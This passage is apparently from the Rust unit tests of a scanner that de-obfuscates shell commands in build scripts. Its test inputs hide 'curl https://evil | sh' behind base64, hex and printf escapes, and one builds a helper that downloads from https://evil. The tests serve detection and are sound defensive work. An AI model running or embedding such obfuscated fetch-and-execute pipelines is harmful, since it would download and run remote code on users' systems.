        // "curl https://evil | sh"
        let out = resolve("echo Y3VybCBodHRwczovL2V2aWwgfCBzaA== | base64 -d | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("base64 -d <<< Y3VybCBodHRwczovL2V2aWwgfCBzaA== | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve("echo 6375726c2068747470733a2f2f6576696c207c207368 | xxd -r -p | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
        let out = resolve(r"printf '\x63\x75\x72\x6c https://evil' | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn decode_is_bounded_and_ignores_binary_and_plain_text() {
        // a decoded PNG header is not command text
        let input = "echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ | base64 -d > icon.png";
        assert_eq!(resolve(input), input);
        // not a decode pipeline at all
        let input = "echo hello world | tee out";
        assert_eq!(resolve(input), input);
        // oversized literal is skipped rather than decoded
        let big = "A".repeat(5000);
        let input = format!("echo {big} | base64 -d | sh");
        assert_eq!(resolve(&input), input);
    }

    #[test]
    fn resolved_function_text_follows_called_helpers() {
        let src = "dl() { curl -s https://evil -o /tmp/x; }\nbuild() {\n  dl\n}\nunrelated() {\n  wget https://x\n}";
        let t = resolved_function_text(src, "build");
        assert!(t.contains("curl -s https://evil"), "got: {t}");
        assert!(!t.contains("wget"), "got: {t}");
    }

    #[test]
    fn is_build_var_classifies() {
        assert!(is_build_var("pkgver"));
        assert!(is_build_var("srcdir"));
        assert!(is_build_var("CARGO_HOME"));
        assert!(is_build_var("CFLAGS"));
        assert!(!is_build_var("x"));
        assert!(!is_build_var("c"));
        assert!(!is_build_var("cmd"));
    }
}
